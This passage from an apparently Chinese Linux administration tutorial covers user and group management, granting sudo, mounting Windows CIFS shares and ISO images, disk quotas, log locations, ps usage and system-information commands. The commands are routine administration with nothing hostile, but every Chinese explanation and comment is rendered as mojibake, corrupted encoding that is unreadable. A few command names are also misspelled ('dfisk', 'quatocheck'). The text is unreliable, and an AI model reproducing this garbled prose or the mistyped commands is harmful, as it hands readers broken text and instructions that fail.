**ä¸è¦å»ºç«‹ç”¨æˆ·ä¸»ç›®å½•**                                       |\n| **-m**   | **è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ä¸»ç›®å½•**                                       |\n| **-p**   | **æŒ‡å®šæ–°ç”¨æˆ·çš„å¯†ç **                                         |\n| **-r**   | **å»ºç«‹ä¸€ä¸ªç³»ç»Ÿå¸å·**                                         |\n| **-s**   | **æŒ‡å®šshell**                                                |\n\nuseraddå‘½ä»¤ç”¨äºLinuxä¸­åˆ›å»ºçš„æ–°çš„ç³»ç»Ÿç”¨æˆ·ã€‚useraddå¯ç”¨æ¥å»ºç«‹ç”¨æˆ·å¸å·ã€‚å¸å·å»ºå¥½ä¹‹åï¼Œå†ç”¨passwdè®¾å®šå¸å·çš„å¯†ç ï¼è€Œå¯ç”¨userdelåˆ é™¤å¸å·ã€‚`ä½¿ç”¨useraddæŒ‡ä»¤æ‰€å»ºç«‹çš„å¸å·ï¼Œå®é™…ä¸Šæ˜¯ä¿å­˜åœ¨/etc/passwdæ–‡æœ¬æ–‡ä»¶ä¸­ã€‚` `ä½¿ç”¨adduseræŒ‡ä»¤æ‰€å»ºç«‹çš„å¸å·ï¼Œä¼šåœ¨homeç›®å½•ä¸‹äº§ç”Ÿå·¥ä½œç›®å½•.`\n\n#### ä¿®æ”¹å¯†ç \n\n```bash\npasswd ç”¨æˆ·å        #æ›´æ”¹æˆ–åˆ›å»ºç”¨æˆ·çš„å¯†ç \nsudo passwd root    #ä¸ºrootè®¾ç½®å¯†ç \n\npasswd -S ç”¨æˆ·å     #æ˜¾ç¤ºç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯\n\npasswd -d ç”¨æˆ·å     #æ¸…é™¤ç”¨æˆ·å¯†ç \n```\n\n**passwdå‘½ä»¤å¸¸ç”¨é€‰é¡¹ï¼š**\n\n| é€‰é¡¹   | ä½œç”¨                                                     |\n| ------ | -------------------------------------------------------- |\n| **-l** | **ç®¡ç†å‘˜é€šè¿‡é”å®šå£ä»¤æ¥é”å®šå·²ç»å‘½åçš„è´¦æˆ·ï¼Œå³ç¦ç”¨è¯¥ç”¨æˆ·** |\n| **-u** | **ç®¡ç†å‘˜è§£å¼€è´¦æˆ·é”å®šçŠ¶æ€**                               |\n| **-x** | **ç®¡ç†å‘˜è®¾ç½®æœ€å¤§å¯†ç ä½¿ç”¨æ—¶é—´ï¼ˆå¤©ï¼‰**                     |\n| **-n** | **ç®¡ç†å‘˜è®¾ç½®æœ€å°å¯†ç ä½¿ç”¨æ—¶é—´ï¼ˆå¤©ï¼‰**                     |\n| **-d** | **ç®¡ç†å‘˜åˆ é™¤ç”¨æˆ·çš„å¯†ç **                                 |\n| **â€“f** | **å¼ºè¿«ç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶ä¿®æ”¹å£ä»¤**                           |\n\npasswdå‘½ä»¤ç”¨äºè®¾ç½®ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·å¯†ç ã€å¯†ç è¿‡æœŸæ—¶é—´ç­‰ã€‚ç³»ç»Ÿç®¡ç†è€…åˆ™èƒ½ç”¨å®ƒç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„å¯†ç ã€‚åªæœ‰ç®¡ç†è€…å¯ä»¥æŒ‡å®šç”¨æˆ·åç§°ï¼Œä¸€èˆ¬ç”¨æˆ·åªèƒ½å˜æ›´è‡ªå·±çš„å¯†ç ã€‚\n\n#### ä¿®æ”¹ç”¨æˆ·å±æ€§\n\n```bash\nusermod é€‰é¡¹ ç”¨æˆ·å   #æ”¹å˜ç”¨æˆ·å±æ€§\n```\n\n**usermodå‘½ä»¤å¸¸ç”¨é€‰é¡¹:**\n\n| **é€‰é¡¹** | **ä½œç”¨**                               |\n| -------- | -------------------------------------- |\n| **-d**   | **ä¿®æ”¹ç”¨æˆ·ä¸»ç›®å½•**                     |\n| **-e**   | **ä¿®æ”¹å¸å·çš„æœ‰æ•ˆæœŸé™**                 |\n| **-f**   | **ä¿®æ”¹åœ¨å¯†ç è¿‡æœŸåå¤šå°‘å¤©å³å…³é—­è¯¥å¸å·** |\n| **-g**   | **ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„ç»„**                   |\n| **-G**   | **ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„**               |\n| **-l**   | **ä¿®æ”¹ç”¨æˆ·å¸å·åç§°**                   |\n| **-L**   | **é”å®šç”¨æˆ·å¯†ç ï¼Œä½¿å¯†ç æ— æ•ˆ**           |\n| **-s**   | **ä¿®æ”¹ç”¨æˆ·ç™»å…¥åæ‰€ä½¿ç”¨çš„shell**        |\n| **-u**   | **ä¿®æ”¹ç”¨æˆ·ID**                         |\n| **-U**   | **è§£é™¤å¯†ç é”å®š**                       |\n\n#### åˆ é™¤ç”¨æˆ·\n\n```bash\nuserdel é€‰é¡¹ ç”¨æˆ·å   #åˆ é™¤ç”¨æˆ·å¸å·\n\nuserdel  test4         åˆ é™¤ç”¨æˆ·test4ï¼Œä¿ç•™ä¸»ç›®å½•\nuserdel  test5  -r     åˆ é™¤ç”¨æˆ·test5åŠå…¶ä¸»ç›®å½•\n```\n\n## ç”¨æˆ·ç»„ç®¡ç†\n\næ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ç»„ï¼Œç³»ç»Ÿå¯ä»¥å¯¹ä¸€ä¸ªç”¨æˆ·ç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·è¿›è¡Œé›†ä¸­ç®¡ç†ã€‚ä¸åŒLinux ç³»ç»Ÿå¯¹ç”¨æˆ·ç»„çš„è§„å®šæœ‰æ‰€ä¸åŒï¼Œå¦‚Linuxä¸‹çš„ç”¨æˆ·å±äºä¸å®ƒåŒåçš„ç”¨æˆ·ç»„ï¼Œè¿™ä¸ªç”¨æˆ·ç»„åœ¨åˆ›å»ºç”¨æˆ·æ—¶åŒæ—¶åˆ›å»ºã€‚\n\nç”¨æˆ·ç»„çš„ç®¡ç†æ¶‰åŠç”¨æˆ·ç»„çš„æ·»åŠ ã€åˆ é™¤å’Œä¿®æ”¹ã€‚ç»„çš„å¢åŠ ã€åˆ é™¤å’Œä¿®æ”¹å®é™…ä¸Šå°±æ˜¯å¯¹/etc/groupæ–‡ä»¶çš„æ›´æ–°ã€‚\n\n**ç³»ç»Ÿç”¨æˆ·ç»„çš„ç®¡ç†ç›¸å…³å‘½ä»¤**:\n\n#### å¢åŠ ç»„\n\n```bash\ngroupadd é€‰é¡¹ ç»„å \n\ngroupadd -g 343 newgroup\n#æ–°å»ºä¸€ä¸ªIDä¸º343çš„ç»„\n```\n\n**groupaddå‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹**\n\n| **é€‰é¡¹** | **ä½œç”¨**                                         |\n| -------- | ------------------------------------------------ |\n| **â€“g**   | **æŒ‡å®šç»„IDå·ï¼Œé™¤éä½¿ç”¨-oé€‰é¡¹ï¼Œå¦åˆ™è¯¥å€¼å¿…é¡»å”¯ä¸€** |\n| **â€“o**   | **å…è®¸è®¾ç½®ç›¸åŒç»„idçš„ç¾¤ç»„ï¼Œä¸å¿…å”¯ä¸€**             |\n| **â€“r**   | **å»ºç«‹ç³»ç»Ÿç»„è´¦å·ï¼Œå³ç»„IDä½äº499**                |\n| **â€“f**   | **å¼ºåˆ¶æ‰§è¡Œï¼Œåˆ›å»ºç›¸åŒidçš„ç»„**                     |\n\n#### æ›´æ”¹ç»„å±æ€§\n\n```bash\ngroupmod é€‰é¡¹ ç»„å\n\ngroupmod -n linux newgroup\n#å°†newgroupç¾¤ç»„çš„åç§°æ”¹ä¸ºlinux\n```\n**groupmodå‘½ä»¤çš„å¸¸ç”¨é€‰é¡¹**\n\n| **é€‰é¡¹** | **ä½œç”¨**                               |\n| -------- | -------------------------------------- |\n| **â€“g**   | **æŒ‡å®šç»„IDå·**                         |\n| **â€“o**   | **ä¸groupaddç›¸åŒï¼Œé‡å¤ä½¿ç”¨ç¾¤ç»„è¯†åˆ«ç ** |\n| **â€“n**   | **ä¿®æ”¹ç”¨æˆ·ç»„å**                       |\n\n#### åˆ é™¤ç»„\n\n```bash\ngroupdel ç»„å \n\ngroupdel  linux\n#åˆ é™¤linuxç»„ å¦‚æœç»„é‡Œé¢æœ‰ç”¨æˆ·ï¼Œé‚£ä¹ˆéœ€è¦å…ˆåˆ é™¤ç”¨æˆ·ï¼Œå†åˆ é™¤ç»„ã€‚      \n```\n\n#### æ·»åŠ ç”¨æˆ·å…¥ç»„\n\n```bash\nsudo gpasswd -M user1,user2  group  \n#ä¸ºgroupç»„æŒ‡å®šuser1å’Œuser2ç»„æˆå‘˜\n```\n\n#### åˆ é™¤ç»„ä¸­ç”¨æˆ·\n\n```bash\ngpasswd -d test4 sudo\n#å°†ç»„sudoä¸­çš„ç”¨æˆ·test4åˆ é™¤\n```\n\n## ç”¨æˆ·æƒé™\n\n> ç¬¬ä¸€ä¸ªç”¨æˆ·é»˜è®¤æœ‰sudoæƒé™\n\nä¸¤ç§æ–¹æ³•è®©æ™®é€šç”¨æˆ·å…·æœ‰sudo çš„æƒé™ï¼š\n\n- ä¿®æ”¹é…ç½®æ–‡ä»¶(/etc/sudoers)æŠŠç”¨æˆ·åŠ åˆ°sudoç»„\n\n```bash\nsudo gedit /etc/sudoers\n\n#åœ¨æ–‡ä»¶æ­¤å¤„æ·»åŠ ä½ è¦åŠ çš„ç”¨æˆ·\n# Allow members of group sudo to execute any command\n%sudo\tALL=(ALL:ALL) ALL\njwt     ALL=(ALL:ALL) ALL  #å°†jwtç”¨æˆ·åŠ è¿›å»äº†\n```\n\n- ä½¿ç”¨å‘½ä»¤æŠŠç”¨æˆ·åŠ åˆ°sudoç»„\n\n```bash\n#æ–¹æ³•ä¸€\nsudo usermod  -G  sudo  jwt  #æ·»åŠ ç”¨æˆ·jwtè¿›å…¥ç»„sudo\n\n#æ–¹æ³•äºŒ\nsudo gpasswd -a jwt  sudo    #æ·»åŠ ç”¨æˆ·jwtè¿›å…¥ç»„sudo\n```\n\n## è®¾å¤‡ç®¡ç†\n\n#### åŸºç¡€å‘½ä»¤\n\n```bash\nfdisk -l #ç£ç›˜åŠåˆ†åŒºç®¡ç†å·¥å…·ï¼Œåœ¨ç¡¬ç›˜è®¾å¤‡ä¸­åˆ›å»ºã€åˆ é™¤ã€æ›´æ”¹åˆ†åŒºç­‰æ“ä½œé€šè¿‡fdiskå‘½ä»¤è¿›è¡Œ\n\nmkfs #å°†ç¡¬ç›˜åˆ†åŒºåï¼Œä½¿ç”¨mkfsï¼ˆMake Filesystemï¼Œåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼‰å‘½ä»¤å¯å¯¹å…¶è¿›è¡Œæ ¼å¼åŒ–ã€‚\n# mkfs  -t  ext3  /dev/hdb1\n\nfsck #æ‰«æç£ç›˜é—®é¢˜\n\ndf #å‘½ä»¤åŠŸèƒ½æ˜¯æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿçš„ç£ç›˜ç©ºé—´å ç”¨æƒ…å†µã€‚\n\ndu #ç»Ÿè®¡ç›®å½•ï¼ˆæˆ–æ–‡ä»¶ï¼‰æ‰€å ç£ç›˜ç©ºé—´çš„å¤§å°ã€‚-aæ˜¾ç¤ºæ¯ä¸ªå­æ–‡ä»¶çš„ç£ç›˜å ç”¨é‡ -s ç»Ÿè®¡æ€»ç£ç›˜å ç”¨é‡\n# du -a /home/user/dir\n\nquota #å‘½ä»¤å¯ä»¥æ˜¾ç¤ºç£ç›˜å·²ä½¿ç”¨çš„ç©ºé—´ä¸é™åˆ¶\n\nmount #å‘½ä»¤å¯ä»¥å®ç°å¯¹å­˜å‚¨è®¾å¤‡çš„æŒ‚è½½\nmount -t \nç¤ºä¾‹ï¼šæŒ‚è½½uç›˜è®¾å¤‡ï¼ˆå‡è®¾uç›˜æ ‡è¯†ä¸ºsdb1ï¼‰åˆ°/mnt/usbç›®å½•ã€‚\n#mount  /dev/sdb1  /mnt/usb\n```\n\n### ä½¿ç”¨cifsåœ¨Linuxä¸ŠæŒ‚è½½Windowså…±äº«\n\n#### **æ–¹æ³•ä¸€**ï¼šä½¿ç”¨å‘½ä»¤è¿›è¡ŒæŒ‚è½½\n\n1.æŸ¥çœ‹Windowsçš„IP:**ipconfig**ï¼Œæˆ‘çš„ipæ˜¯192.168.137.1\n\n2.åœ¨Windowsä¸Šå»ºç«‹å…±äº«æ–‡ä»¶\n\n![](https://i.loli.net/2020/04/21/78HuMbGZnemYV2q.png)\n\n3.åœ¨linuxä¸Šæ–°å»ºè¦æŒ‚è½½åˆ°çš„æ–‡ä»¶å¤¹ æˆ‘æ˜¯å»ºåœ¨`~/Win-Share`\n\n4.åœ¨linuxä¸Šæ‰§è¡ŒæŒ‚è½½è¯­å¥\n\n```bash\nsudo mount -t cifs -o username='Winç”¨æˆ·å',password='ç™»å½•å¯†ç ',uid=jwt,gid=jwt //192.168.137.1/Ubuntu-Share/ ~/Win-Share\n\n\n# username,passwordæ˜¯windowsç™»å½•ç”¨æˆ·åå¯†ç ï¼Œä¸€å®šä¸èƒ½è¾“é”™ã€‚\n# //192.168.137.1/Ubuntu-Share/ å°±æ˜¯windowsè¦çš„å…±äº«æ–‡ä»¶å¤¹\n# ~/Win-Shareæ˜¯linuxå°†å…±äº«æ–‡ä»¶å¤¹è¦æŒ‚è½½åˆ°çš„åœ°æ–¹ï¼Œå¯ä»»æ„å®šä½ç½®\n# uidå’Œgidä¹Ÿå¯ä»¥ä¸è¦ï¼Œuidå’ŒgidæŸ¥çœ‹æ–¹æ³•ï¼šå‘½ä»¤è¡Œæ‰§è¡Œ\"id\"å‘½ä»¤\n\nsudo apt install cifs-utils #æ²¡æœ‰cifsæ‰§è¡Œè¿™ä¸ªå‘½ä»¤å®‰è£…\nsudo mount -t c(table) #æŸ¥çœ‹æ˜¯å¦æœ‰cifs\n```\n\n5.å–æ¶ˆæŒ‚è½½\n\n```bash\nsudo umount ~/Win-Share\n```\n\n6.æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯\n\n```bash\n$ mount | grep Win-Share\n//192.168.137.1/Ubuntu-Share/ on /home/jwt/Win-Share type cifs (rw,relatime,vers=default,cache=strict,username=admin,domain=,uid=0,noforceuid,gid=0,noforcegid,addr=192.168.137.1,file_mode=0755,dir_mode=0755,soft,nounix,serverino,mapposix,rsize=1048576,wsize=1048576,echo_interval=60,actimeo=1)\n```\n\n#### æŒ‚è½½æ—¶é‡è§çš„é”™è¯¯\n\næˆ‘æ‰§è¡Œæ—¶é‡åˆ°äº†`æ— æ³•ä»¥åªè¯»æ–¹å¼æŒ‚è½½`çš„é”™è¯¯ï¼Œæ’æŸ¥ä¹‹åæ˜¯æˆ‘çš„ç”¨æˆ·åé”™äº†\n\n![](https://i.loli.net/2020/04/21/tuOR845TNiShLCf.png)\n\næŸ¥çœ‹Winç”¨æˆ·`net user`,æˆ‘å¼€å§‹ä½¿ç”¨Administratorï¼Œä¸€ç›´æŠ¥é”™ï¼Œæ¢æˆadminæˆåŠŸäº†ï¼Œæ‰€ä»¥ç”¨æˆ·åå’Œå¯†ç ä¸€å®šä¸è¦è¾“é”™äº†\n\n![](https://i.loli.net/2020/04/21/KUmtpdRrTvs9F7k.png)\n\n#### æ–¹æ³•äºŒï¼šæ‰‹åŠ¨æŒ‚è½½\n\næ‰“å¼€æ–‡ä»¶ï¼Œç‚¹å‡»å…¶ä»–ä½ç½®ï¼Œåœ¨è¿æ¥åˆ°æœåŠ¡è¾“å…¥`smb://ip/winå…±äº«æ–‡ä»¶å¤¹`,ç‚¹å‡»è¿æ¥è¾“å…¥winç”¨æˆ·åå’Œå¯†ç \n\n```\nsmb://192.168.137.1/ubuntu-share/\n```\n\n![](https://i.loli.net/2020/04/21/D7KCcizMoEIYVsx.png)\n\n### æŒ‚è½½å…‰ç›˜æ–‡ä»¶ iso\n\n1.\tåˆ¶ä½œå…‰ç›˜é•œåƒæ–‡ä»¶\n2.\tæŒ‚è½½è¯¥æ–‡ä»¶\n\n```bash\n#æµç¨‹\n1.\tå°†æ–‡ä»¶å’Œç›®å½•åˆ¶ä½œæˆå…‰ç›˜é•œåƒæ–‡ä»¶ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚\n#mkisofs -r -J -V tt  -o ~/Desktop/tt.iso ~/Desktop/exam\n2.\tå°†æ–°çš„å…‰ç›˜é•œåƒåŠ è½½\nsudo mount -t iso9660 -o loop ~/Desktop/tt.iso  ~/Desktop/tTest\n```\n\n### ç»¼åˆæ¡ˆä¾‹\n\n> æ–°å¢åŠ ä¸€ä¸ªç£ç›˜ï¼Œå¯¹ç£ç›˜è¿›è¡Œåˆ†åŒºï¼Œæ ¼å¼åŒ–åˆ†åŒºï¼ŒæŒ‚è½½åˆ†åŒºï¼Œå¹¶ç»™è¯¥ç£ç›˜è¿›è¡Œé…é¢ã€‚æŒ‡å®šç”¨æˆ·é™é¢æµç¨‹ï¼š\n\næµç¨‹ï¼š\n1.\tè™šæ‹Ÿæœº -->è®¾ç½®-->æ·»åŠ ç£ç›˜  é‡å¯Ubuntu ï¼ˆæ¨¡æ‹ŸæœåŠ¡å™¨æ¥äº†ä¸€ä¸ªæ–°ç¡¬ç›˜ï¼‰\n2.\tæŸ¥çœ‹åˆ†åŒºä¿¡æ¯ï¼Œè™šæ‹Ÿæœºæ–°å»ºåˆ†åŒº\n3.\tdfisk è¿›è¡Œåˆ†åŒº\n4.\tæ ¼å¼åŒ–æ–°åˆ†åŒº\n5.\tæ–°å»ºæŒ‚è½½ç‚¹  sudo mkdir /home/newdisk\n6.\tå°†åˆ†åŒºæŒ‚è½½åˆ° æŒ‚è½½ç‚¹ sudo mount /dev/sdb1  /home/newDisk.\n\né…é¢è®¾ç½®ï¼š\n\n1.\tmount å°†ç£ç›˜é‡æ–°æŒ‚è½½åˆ°ç”¨æˆ·é…é¢å’Œç»„é…é¢ sudo mount -o remount,usrquota,grpquota  /home/newDisk\n2.\tæ£€æŸ¥æ˜¯å¦æŒ‚è½½åˆ°é…é¢ mount | grep sdb1\n3.\tæŸ¥çœ‹é…é¢ä¿¡æ¯  quatocheck -avug\n4.\tå¼€å¯é…é¢ ï¼ˆæœåŠ¡ï¼‰ sudo quotaon -vug  /home/newDisk\n5.\tç»™ç”¨æˆ·åˆ†é…é…é¢ã€‚ Sudo edquota -u zj    Ctrl + O, ctrl+m ,ctrl+x\n6.\tç»™ç»„åˆ†é…é™ª  Sudo edquota -g zj   (ç¡¬é™åˆ¶>è½¯é™åˆ¶ï¼‰\n7.\t æŸ¥çœ‹é…é¢ sudo quota -uvs zj\n8.\tæµ‹è¯•\n\n## æ—¥å¿—ç®¡ç†\n\n> æ—¥å¿—æ–‡ä»¶æ‰€å¤„çš„ä½ç½®éƒ½åœ¨**/var/log**ç›®å½•ä¸‹\n\n```bash\nalternatives.log   -æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­\nkern.logÂ    â€“åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚\napport.logÂ  -åº”ç”¨ç¨‹åºå´©æºƒè®°å½•\napt/Â  ç”¨apt-getå®‰è£…å¸è½½è½¯ä»¶çš„ä¿¡æ¯\nauth.log Â -ç™»å½•è®¤è¯log\nboot.logÂ Â -åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚\nwtmp Â â€”åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚\nbtmpÂ Â Â Â -è®°å½•æ‰€æœ‰å¤±è´¥å¯åŠ¨ä¿¡æ¯\ndist-upgradeÂ Â -dist-upgradeæ›´æ–°æ–¹å¼çš„ä¿¡æ¯\ndpkg.logÂ Â Â -Â åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚\nfontconfig.logÂ -ä¸å­—ä½“é…ç½®æœ‰å…³çš„logã€‚\nlastlogÂ â€”è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚\nfaillogÂ â€“åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚\n```\n\nLinuxç³»ç»Ÿä¸­çš„æœ‰ä¸‰ä¸ªä¸»è¦çš„æ—¥å¿—å­ç³»ç»Ÿ\n\n1.è¿æ¥æ—¶é—´æ—¥å¿—å­ç³»ç»Ÿ utmpã€wtmpå’Œlastlog\n\n2.è¿›ç¨‹ç»Ÿè®¡æ—¥å¿—å­ç³»ç»Ÿ\n\n3.é”™è¯¯æ—¥å¿—å­ç³»ç»Ÿ\n\n**less  --ä¸»è¦ç”¨æ¥æŸ¥çœ‹æ—¥å¿—**\n\n```bash\nG:è·³è½¬åˆ°æœ«å°¾\n/å­—ç¬¦ä¸²ï¼šå‘ä¸‹æœç´¢\"å­—ç¬¦ä¸²\"çš„åŠŸèƒ½\n?å­—ç¬¦ä¸²ï¼šå‘ä¸Šæœç´¢\"å­—ç¬¦ä¸²\"çš„åŠŸèƒ½\nnï¼šé‡å¤å‰ä¸€ä¸ªæœç´¢ï¼ˆä¸ / æˆ– ? æœ‰å…³ï¼‰\nNï¼šåå‘é‡å¤å‰ä¸€ä¸ªæœç´¢ï¼ˆä¸ / æˆ– ? æœ‰å…³ï¼‰\nq: é€€å‡º\nç©ºæ ¼é”® æ»šåŠ¨ä¸€é¡µ\nå›è½¦é”® æ»šåŠ¨ä¸€è¡Œ\n```\n\n**free** å†…å­˜æŸ¥çœ‹å‘½ä»¤ \n\n**Lastcomm** å¯ä»¥ç›‘æµ‹ç³»ç»Ÿä¸­ä»»ä½•æ—¶å€™æ‰§è¡Œçš„å‘½ä»¤\n\n## è¿›ç¨‹ç®¡ç†\n\n```bash\n#æŸ¥çœ‹è¿›ç¨‹\nps  é™æ€çš„\ntop åŠ¨æ€çš„\n```\n\nps-æ˜¾ç¤ºå½“å‰è¿›ç¨‹çš„çŠ¶æ€\n\n```bash\nps -l  #å°†ç›®å‰å±äºæ‚¨è‡ªå·±è¿™æ¬¡ç™»å…¥çš„ PID ä¸ç›¸å…³ä¿¡æ¯åˆ—ç¤ºå‡ºæ¥ï¼Œé•¿æ ¼å¼æ˜¾ç¤ºæ›´åŠ è¯¦ç»†çš„ä¿¡æ¯ï¼›\nps -a  #æ˜¾ç¤ºä¸€ä¸ªç»ˆç«¯çš„æ‰€æœ‰è¿›ç¨‹ï¼Œé™¤ä¼šè¯å¼•çº¿å¤–ï¼› tty:ç»ˆç«¯\nps -A  #æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ä¿¡æ¯\nps â€“u root #æŒ‡å®šç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯\nps -e  #æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ä¿¡æ¯\n\nps aux ##æŸ¥çœ‹ç³»ç»Ÿä¸­æ‰€æœ‰çš„è¿›ç¨‹æ˜¾ç¤ºæ‰€æœ‰åŒ…å«å…¶ä»–ä½¿ç”¨è€…çš„è¡Œç¨‹\nps -axjf #ä»¥ç¨‹åºæ ‘çš„æ–¹å¼æ˜¾ç¤º\nps -eLf #æ˜¾ç¤ºçº¿ç¨‹ä¿¡æ¯\nps -a | wc -l #ç»Ÿè®¡è¡Œæ•°\nps -ef | grep queue | grep -v grep | wc -l #æŸ¥æ‰¾å«æœ‰queueå…³é”®è¯çš„è¿›ç¨‹ï¼ˆ-vå»æ‰grepæœ¬èº«ï¼‰ï¼Œè¾“å‡ºæ‰¾åˆ°çš„è¿›ç¨‹æ•°é‡ã€‚\nps -aux | awk '$2~/S/ {print $0}' #ç»Ÿè®¡sleepçŠ¶æ€çš„è¿›ç¨‹\n#ç»Ÿè®¡ç»ˆç«¯ä¸ºtty1çš„æ‰€æœ‰è¿›ç¨‹\nps aux | awk '$7~/tty1/' | wc -l   #$7è¡¨ç¤ºttyåœ¨ps aux æ•°æ®çš„ç¬¬7åˆ— #  ~/tty1/ è¡¨ç¤ºåŒ…å«tty1çš„\n\n```\n\n## æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯å‘½ä»¤\n\n````bash\nuname -a # æŸ¥çœ‹å†…æ ¸/æ“ä½œç³»ç»Ÿ/CPUä¿¡æ¯ \nhead -n 1 /etc/issue # æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬ \ncat /proc/cpuinfo # æŸ¥çœ‹CPUä¿¡æ¯ \nhostname # æŸ¥çœ‹è®¡ç®—æœºå \nlspci -tv # åˆ—å‡ºæ‰€æœ‰PCIè®¾å¤‡ \nlsusb -tv # åˆ—å‡ºæ‰€æœ‰USBè®¾å¤‡ \nlsmod # åˆ—å‡ºåŠ è½½çš„å†…æ ¸æ¨¡å— \nenv # æŸ¥çœ‹ç¯å¢ƒå˜é‡èµ„æº \nfree -m # æŸ¥çœ‹å†…å­˜ä½¿ç”¨é‡å’Œäº¤æ¢åŒºä½¿ç”¨é‡ \ndf -h # æŸ¥çœ‹å„åˆ†åŒºä½¿ç”¨æƒ…å†µ \ndu -sh <ç›®å½•å> # æŸ¥çœ‹æŒ‡å®šç›®å½•çš„å¤§å° \ngrep MemTotal /proc/meminfo # æŸ¥çœ‹å†…å­˜æ€»é‡ \ngrep MemFree /proc/meminfo # æŸ¥çœ‹ç©ºé—²å†…å­˜é‡ \nuptime # æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œæ—¶é—´ã€ç”¨æˆ·æ•°ã€è´Ÿè½½ \ncat /proc/loadavg # æŸ¥çœ‹ç³»ç»Ÿè´Ÿè½½ç£ç›˜å’Œåˆ†åŒº \nmount | column -t # æŸ¥çœ‹æŒ‚æ¥çš„åˆ†åŒºçŠ¶æ€ \nfdisk -l # æŸ¥çœ‹æ‰€æœ‰åˆ†åŒº \nswapon -s # æŸ¥çœ‹æ‰€æœ‰äº¤æ¢åˆ†åŒº \nhdparm -i /dev/hda # æŸ¥çœ‹ç£ç›˜å‚æ•°(ä»…é€‚ç”¨äºIDEè®¾å¤‡) \ndmesg | grep IDE # æŸ¥çœ‹å¯åŠ¨æ—¶IDEè®¾å¤‡æ£€æµ‹çŠ¶å†µç½‘ç»œ \nifconfig # æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œæ¥å£çš„å±æ€§ \niptables -L # æŸ¥çœ‹é˜²ç«å¢™è®¾ç½® \nroute -n # æŸ¥çœ‹è·¯ç”±è¡¨ \nnetstat -lntp # æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£ \nnetstat -antp # æŸ¥çœ‹æ‰€æœ‰å·²ç»å»ºç«‹çš„è¿æ¥ \nnetstat -s # æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯è¿›ç¨‹ \nps -ef # æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ \ntop # å®æ—¶æ˜¾ç¤ºè¿›ç¨‹çŠ¶æ€ç”¨æˆ· \nw # æŸ¥çœ‹æ´»åŠ¨ç”¨æˆ· \nid <ç”¨æˆ·å> # æŸ¥çœ‹æŒ‡å®šç”¨æˆ·ä¿¡æ¯ \nlast # æŸ¥çœ‹ç”¨æˆ·ç™»å½•æ—¥å¿— \ncut -d: -f1 /etc/passwd # æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç”¨æˆ· \ncut -d: -f1 /etc/group # æŸ¥çœ‹ç³»ç»Ÿæ‰€æœ‰ç»„ \ncrontab -l # æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„è®¡åˆ’ä»»åŠ¡æœåŠ¡ \nchkconfig â€“list # åˆ—å‡ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡ \nchkconfig â€“list | grep on # åˆ—å‡ºæ‰€æœ‰å¯åŠ¨çš„ç³»ç»ŸæœåŠ¡ç¨‹åº \nrpm -qa # æŸ¥çœ‹æ‰€æœ‰å®‰è£…çš„è½¯ä»¶åŒ…\n````\n\n## å…¶ä»–å¸¸ç”¨å‘½ä»¤\n\n```bash\npwdï¼šæ˜¾ç¤ºå½“å‰æ‰€åœ¨ä½ç½®\n\nuname -a æŸ¥çœ‹å†…æ ¸/æ“ä½œç³»ç»Ÿ/CPUä¿¡æ¯\n\ngrep è¦æœç´¢çš„å­—ç¬¦ä¸² è¦æœç´¢çš„æ–‡ä»¶ --colorï¼šæœç´¢å‘½ä»¤ï¼Œ--colorä»£è¡¨é«˜äº®æ˜¾ç¤º\n\nps -ef/ps 